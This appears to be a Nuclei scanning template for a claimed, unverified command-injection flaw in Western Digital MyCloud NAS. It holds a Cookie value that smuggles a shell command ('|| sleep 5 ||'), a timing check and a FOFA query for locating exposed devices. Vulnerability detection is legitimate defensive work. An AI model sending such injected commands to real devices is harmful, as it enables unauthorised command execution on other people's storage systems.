id: wd-cloud-index-rce
info:
  name: 西部数码 NAS wdcloud index.php 命令执行漏洞
  author: leadlife
  severity: critical
  description: Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS index.php中Cookie存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。
  reference: 
    - https://www.yuque.com/lvguo-pibd8/fqbwsx/rrh5apw1hq2gxa4f
  classification:
    cve-id: 
  metadata:
    verified: false
    fofa-query: body="_PROJECT_MODEL_ID_KINGS_CANYON" || banner="Welcome to WD My Cloud"
    tips: 未验证成功
    repair:
    sqlmap:
    version:
  tags: rce,wdcloud

http:
  - raw:  
      - |
        @timeout: 15s
        GET /web/index.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
        Cookie: username=a" || sleep 5 || "

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - duration >= 5 && duration < 9
        condition: and